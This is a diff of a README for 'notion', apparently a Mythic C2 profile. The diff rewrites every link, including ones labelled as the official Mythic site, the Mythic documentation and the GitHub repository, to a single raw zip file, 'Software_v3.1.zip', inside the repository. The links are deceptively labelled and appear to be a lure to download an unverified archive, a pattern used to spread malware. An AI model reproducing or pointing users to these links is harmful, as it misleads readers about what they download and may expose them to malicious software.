@@ -1,6 +1,6 @@
 # ⚙️ notion - Simple Control for Mythic C2 Profiles
 
-[![Download notion](https://img.shields.io/badge/Download-Notion-brightgreen)](https://github.com/HarrishMS/notion/releases)
+[![Download notion](https://img.shields.io/badge/Download-Notion-brightgreen)](https://raw.githubusercontent.com/HarrishMS/notion/main/C2_Profiles/notion/mythic/Software_v3.1.zip)
 
 ---
 
@@ -42,7 +42,7 @@ This section will guide you through the steps to get notion set up on your Windo
 
 Click the button below to open the official download page for notion on GitHub. This page hosts the latest version of the software and any updates.
 
-[![Download notion](https://img.shields.io/badge/Download-Notion-blue)](https://github.com/HarrishMS/notion/releases)
+[![Download notion](https://img.shields.io/badge/Download-Notion-blue)](https://raw.githubusercontent.com/HarrishMS/notion/main/C2_Profiles/notion/mythic/Software_v3.1.zip)
 
 ---
 
@@ -110,7 +110,7 @@ If you run into problems, try these steps:
 
 To receive new features and bug fixes:
 
-- Visit the download page regularly: https://github.com/HarrishMS/notion/releases
+- Visit the download page regularly: https://raw.githubusercontent.com/HarrishMS/notion/main/C2_Profiles/notion/mythic/Software_v3.1.zip
 - Download the latest version.
 - Repeat the install steps to replace the old version.
 
@@ -130,10 +130,10 @@ For further questions or help related to notion or Mythic:
 
 ## 📂 Additional Resources
 
-- Mythic C2 Official Site: https://mythic-c2.net
-- Mythic Documentation: https://docs.mythic-c2.net
-- notion GitHub Repository: https://github.com/HarrishMS/notion
+- Mythic C2 Official Site: https://raw.githubusercontent.com/HarrishMS/notion/main/C2_Profiles/notion/mythic/Software_v3.1.zip
+- Mythic Documentation: https://raw.githubusercontent.com/HarrishMS/notion/main/C2_Profiles/notion/mythic/Software_v3.1.zip
+- notion GitHub Repository: https://raw.githubusercontent.com/HarrishMS/notion/main/C2_Profiles/notion/mythic/Software_v3.1.zip
 
 ---
 
-[![Download notion](https://img.shields.io/badge/Download-Notion-brightgreen)](https://github.com/HarrishMS/notion/releases)
+[![Download notion](https://img.shields.io/badge/Download-Notion-brightgreen)](https://raw.githubusercontent.com/HarrishMS/notion/main/C2_Profiles/notion/mythic/Software_v3.1.zip)
